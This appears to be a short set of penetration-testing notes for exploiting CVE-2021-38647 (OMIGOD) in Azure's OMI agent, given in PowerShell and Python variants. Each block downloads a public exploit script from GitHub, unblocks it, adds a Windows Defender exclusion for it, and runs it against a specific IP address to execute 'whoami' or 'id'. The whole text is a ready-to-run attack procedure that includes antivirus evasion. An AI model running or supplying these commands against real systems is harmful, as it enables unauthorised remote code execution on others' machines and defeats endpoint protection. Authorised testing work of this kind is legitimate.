
### Download and execute exploit for CVE-2021-38647 (PowerShell)
```
cd "$env:SystemDrive\PentestTools\Azure\Attack"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/AlteredSecurity/CVE-2021-38647/main/Invoke-CVE-2021-38647.ps1" -OutFile "Invoke-CVE-2021-38647.ps1"

Unblock-File .\Invoke-CVE-2021-38647.ps1

Add-MpPreference -ExclusionPath "$env:SystemDrive\PentestTools\Azure\Attack\Invoke-CVE-2021-38647.ps1"

Invoke-CVE-2021-38647 -TargetIP 74.235.208.136 -TargetPort 5986 -Command whoami
```

### Download and execute exploit for CVE-2021-38647 (Python)
```
cd "$env:SystemDrive\PentestTools\Azure\Attack"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/horizon3ai/CVE-2021-38647/main/omigod.py" -OutFile "omigod.py"

Unblock-File .\omigod.py

Add-MpPreference -ExclusionPath "$env:SystemDrive\PentestTools\Azure\Attack\omigod.py"

python3.12.exe .\omigod.py -t 74.235.208.136 -c id

python3 omigod.py -t 74.235.208.136 -c id
```